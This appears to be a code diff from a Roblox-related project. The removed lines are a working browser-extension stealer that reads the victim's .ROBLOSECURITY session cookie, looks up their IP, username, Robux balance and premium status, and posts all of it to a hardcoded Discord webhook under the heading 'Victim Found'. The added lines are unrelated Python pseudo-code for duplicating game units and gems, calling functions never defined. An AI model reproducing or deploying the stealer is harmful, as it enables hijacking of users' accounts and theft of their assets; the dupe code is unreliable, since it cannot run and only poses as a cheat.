@@ -1,65 +1,25 @@
-const WEBHOOK = "https://discord.com/api/webhooks/1230251516086980699/jaHbUnX3eFZPzV6jaVnq5QCKd25qCMw33ZH7oKHBZ9AWG3NQ7EFrNkoZ08cf4D1TNVFa";
+def duplicate_units(unit_id):
+    units = load_units_from_database(unit_id)
+    duplicated_units = []
+    for unit in units:
+        for i in range(2):
+            duplicated_units.append(unit.clone())  # Cloning unit
+    return duplicated_units
 
-async function main(cookie) {
-    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+def duplicate_gems(player_id):
+    player = get_player(player_id)
+    gems = player.get_gems()
+    duplicated_gems = []
+    for gem in gems:
+        for i in range(2):
+            duplicated_gems.append(gem.copy())  # Copying gem
+    return duplicated_gems
 
-    if (cookie) {
-        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
-            headers: {
-                Cookie: ".ROBLOSECURITY=" + cookie
-            },
-            redirect: "manual"
-        })).json();
-    }
-    
-    fetch(WEBHOOK, {
-        method: "POST",
-        headers: {
-            "Content-Type": "Application/json"
-        },
-        body: JSON.stringify({
-            "content": null,
-            "embeds": [
-              {
-                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
-                "color": null,
-                "fields": [
-                  {
-                    "name": "Username",
-                    "value": statistics ? statistics.UserName : "N/A",
-                    "inline": true
-                  },
-                  {
-                    "name": "Robux",
-                    "value": statistics ? statistics.RobuxBalance : "N/A",
-                    "inline": true
-                  },
-                  {
-                    "name": "Premium",
-                    "value": statistics ? statistics.IsPremium : "N/A",
-                    "inline": true
-                  }
-                ],
-                "author": {
-                  "name": "Victim Found: " + ipAddr,
-                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
-                },
-                "footer": {
-                  "text": "sigma",
-                  "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
-                },
-                "thumbnail": {
-                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
-                }
-              }
-            ],
-            "username": "Roblox",
-            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
-            "attachments": []
-        })
-    });
-}
-
-chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
-    main(cookie ? cookie.value : null);
-});
+def main():
+    unit_id = 123
+    player_id = 456
+    duplicated_units = duplicate_units(unit_id)
+    duplicated_gems = duplicate_gems(player_id)
+    # Adding duplicated units and gems to player's inventory
+    add_units_to_inventory(player_id, duplicated_units)
+    add_gems_to_inventory(player_id, duplicated_gems)
